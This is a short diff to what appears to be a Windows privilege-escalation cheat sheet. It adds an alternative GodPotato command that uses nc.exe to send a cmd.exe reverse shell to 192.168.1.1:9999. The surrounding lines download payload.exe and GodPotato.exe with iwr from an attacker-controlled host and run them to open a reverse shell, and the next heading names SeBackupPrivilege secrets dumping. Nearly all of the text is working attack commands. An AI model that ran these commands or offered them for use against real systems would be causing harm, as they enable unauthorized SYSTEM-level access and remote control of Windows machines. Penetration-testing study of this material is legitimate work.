@@ -144,6 +144,10 @@ iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                    
 iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
 ./GodPotato.exe -cmd "powershell /c ./payload.exe"                                              ## exploit: open a reverse shell
 ```
+Alternative:
+``` powershell
+./GodPotato.exe -cmd "./nc.exe -t -e c:\Windows\System32\cmd.exe 192.168.1.1 9999"              ## exploit: nc.exe reverse shell
+```
 
 ## SeBackupPrivileges
 ### Exploit by secrets dump
